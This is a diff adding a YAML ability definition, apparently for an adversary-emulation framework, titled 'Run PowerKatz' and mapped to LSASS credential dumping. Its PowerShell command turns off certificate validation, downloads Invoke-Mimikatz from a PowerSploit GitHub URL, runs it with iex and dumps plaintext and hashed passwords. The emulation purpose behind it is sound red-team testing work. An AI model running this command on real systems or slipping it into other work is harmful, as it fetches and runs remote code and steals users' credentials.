@@ -1,0 +1,22 @@
+---
+
+- id: baac2c6d-4652-4b7e-ab0a-f1bf246edd12
+  name: Run PowerKatz
+  description: Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  platforms:
+    windows:
+      psh:
+        command: |
+          [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+          $web = (New-Object System.Net.WebClient);
+          $result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");
+          iex $result; Invoke-Mimikatz -DumpCreds
+        parsers:
+          plugins.stockpile.app.parsers.katz:
+            - source: domain.user.name
+              edge: has_password
+              target: domain.user.password
